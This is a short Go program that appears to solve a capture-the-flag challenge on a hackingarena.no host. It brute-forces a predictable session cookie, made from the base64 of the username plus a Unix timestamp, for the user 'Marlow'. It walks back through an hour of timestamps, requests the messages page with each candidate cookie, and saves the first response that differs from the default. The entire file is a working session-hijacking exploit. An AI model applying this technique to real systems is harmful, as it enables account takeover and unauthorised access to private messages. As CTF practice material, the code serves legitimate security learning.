package main

import "encoding/base64"
import "net/http"
import "fmt"
import "io"
import "os"
import "strconv"
import "time"

func main() {

	// Marlow was logged in at 14.11.2024 11:44
	tmp, _ := time.Parse(time.DateTime, "2024-11-14 11:44:00")
	login_time := tmp.Unix()

	// bytes of standard response
	messages_bytes := 2253

	// Let's check one hours before that
	for s := 0; s < 60 * 60; s++ {

		hostname := "http://koala.hackingarena.no:803"
		username := "Marlow"
		encoded := base64.URLEncoding.EncodeToString([]byte(username))
		seconds := login_time - int64(3600) - int64(s)
		// lol, my German time is offset 3600 seconds

		cookie := "CalypId=" + encoded + strconv.FormatInt(seconds, 10)

		request, _ := http.NewRequest("GET", hostname + "/messages.php", nil)
		request.Header.Set("Cookie", cookie)
		request.Header.Set("Host", hostname)


		client := &http.Client{}
		response, err1 := client.Do(request)

		if err1 == nil {

			if response.StatusCode == http.StatusOK {

				bytes, err2 := io.ReadAll(response.Body)

				if len(bytes) != messages_bytes {

					if err2 == nil {

						err3 := os.WriteFile("marlow/messages-" + strconv.FormatInt(seconds, 10) + ".php", bytes, 0666)

						if err3 == nil {
							fmt.Println(username + " " + strconv.FormatInt(seconds, 10) + " saved (" + strconv.Itoa(len(bytes)) + " bytes)")
							break
						}

					} else {
						fmt.Println(username + ":", err2)
					}

				}

			}

		} else {
			fmt.Println(username + ":", err1)
		}

	}

}
